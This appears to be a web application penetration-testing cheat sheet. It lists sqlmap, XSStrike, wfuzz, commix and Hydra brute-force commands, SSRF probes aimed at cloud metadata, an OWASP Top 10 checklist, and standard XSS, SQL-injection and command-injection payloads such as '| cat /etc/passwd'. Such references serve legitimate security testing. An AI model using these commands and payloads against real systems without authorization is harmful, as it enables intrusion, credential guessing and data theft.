# Web Application Security Testing Quick Reference

## Quick Commands by Vulnerability Type

### SQL Injection
```bash
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --tables -D database_name
```

### XSS (Cross-Site Scripting)
```bash
# XSStrike
python3 XSStrike/xsstrike.py -u "http://target.com/?q=test"

# Manual testing payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### Directory Traversal
```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/injections/traversal.txt \
    "http://target.com/FUZZ"
```

### Command Injection
```bash
commix -u "http://target.com/?param=test"
```

### Authentication Testing
```bash
# Hydra brute force
hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

### SSRF Testing
```bash
# Inject internal IP addresses
http://target.com?url=http://localhost/admin
http://target.com?url=http://169.254.169.254/
```

### CSRF Testing
# Check if anti-CSRF tokens exist on forms

## OWASP Top 10 Checklist
1. [ ] Injection (SQL, NoSQL, OS, LDAP)
2. [ ] Broken Authentication
3. [ ] Sensitive Data Exposure
4. [ ] XML External Entities (XXE)
5. [ ] Broken Access Control
6. [ ] Security Misconfiguration
7. [ ] XSS (Cross-Site Scripting)
8. [ ] Insecure Deserialization
9. [ ] Using Components with Known Vulnerabilities
10. [ ] Insufficient Logging & Monitoring

## Common Testing Payloads

### XSS
```
<script>alert(document.domain)</script>
<svg/onload=alert('XSS')>
javascript:alert('XSS')
```

### SQL Injection
```
' OR '1'='1
' UNION SELECT NULL--
' AND SLEEP(5)--
```

### Command Injection
```
; ls
| cat /etc/passwd
&& whoami
$(whoami)
```

## Docker Security Tools
```bash
# All-in-one security scanner
docker run -it securecodewarrior/github-actions:v1

# Vulnerability scanner
docker run -v /tmp:/tmp aquasec/trivy image your-app:latest
```
